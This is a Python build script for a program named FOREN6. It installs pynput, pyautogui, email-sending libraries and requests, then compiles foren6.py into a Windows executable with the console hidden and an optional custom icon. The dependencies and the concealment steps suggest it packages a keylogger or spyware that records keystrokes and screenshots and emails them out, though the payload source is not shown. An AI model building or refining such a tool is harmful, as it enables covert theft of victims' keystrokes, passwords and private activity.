import os
import platform
system = platform.system()
if system == "Windows":
    print("Building FOREN6...")
    print("Downloading dependencys...")
    print("Downloading emails...")
    os.system("pip install emails")
    print("completed!!!")
    print("Downloading pynput...")
    os.system("pip install pynput==1.6.8")
    print("Completed!!!")
    print("Downloading smtplib...")
    os.system("pip install smtplib")
    print("Completed!!!")
    print("Downloading pyautogui...")
    os.system("pip install pyautogui")
    print("Completed!!!")
    print("Downloading requests...")
    os.system("pip install requests")
    print("completed!!!")
    print("Downloading nuitka...")
    os.system("pip install -U nuitka")
    print("Downloaded all dependencys!!!!")
    print("Creating exe")
    ic = input("Do you want to use a icon(y/n): ")
    if ic == "y" or ic == "Y":
        icon = input("Icon directory: ")
        os.system(f"nuitka --mingw64 --windows-disable-console --icon={icon} foren6.py")
    elif ic == "n" or ic == "N":
        os.system(f"nuitka --mingw64 --windows-disable-console foren6.py")

